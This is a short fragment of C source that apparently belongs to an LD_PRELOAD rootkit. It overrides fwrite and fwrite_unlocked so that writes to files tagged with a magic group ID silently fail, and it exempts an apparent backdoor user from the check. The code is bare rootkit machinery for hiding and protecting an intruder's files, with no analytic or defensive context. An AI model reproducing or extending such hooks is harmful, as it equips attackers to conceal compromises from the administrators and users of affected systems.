size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
{
    HOOK(o_fwrite,CFWRITE);
    if(is_bdusr()) return o_fwrite(ptr,size,nmemb,stream);
    if(hfxstat(fileno(stream),MGID,32)) return 0;
    return o_fwrite(ptr,size,nmemb,stream);
}

size_t fwrite_unlocked(const void *ptr, size_t size, size_t nmemb, FILE *stream)
{
    HOOK(o_fwrite_unlocked, CFWRITE_UNLOCKED);
    if(is_bdusr()) return o_fwrite_unlocked(ptr,size,nmemb,stream);
    if(hfxstat(fileno(stream),MGID,32)) return 0;
    return o_fwrite_unlocked(ptr,size,nmemb,stream);
}
